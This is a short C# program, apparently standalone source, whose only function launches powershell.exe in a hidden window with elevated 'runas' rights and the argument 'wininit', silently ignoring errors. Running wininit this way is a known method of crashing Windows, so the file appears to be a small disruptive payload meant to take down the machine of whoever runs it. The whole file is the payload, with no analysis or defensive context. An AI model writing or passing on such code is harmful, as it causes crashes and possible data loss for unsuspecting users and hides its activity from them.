﻿using System;
using System.Diagnostics;

namespace PowerShell_Wininit {
    public abstract class Program {
        private static void Main() {
            PowerShell_Wininit();
        }

        public static void PowerShell_Wininit() {
            try {
                var process = new Process {
                    StartInfo = new ProcessStartInfo {
                        WindowStyle = ProcessWindowStyle.Hidden,
                        FileName = "powershell.exe",
                        Arguments = "wininit",
                        UseShellExecute = true,
                        Verb = "runas"
                    }
                };
                process.Start();
            } catch (Exception) {
                // ignored
            }
        }
    }
}
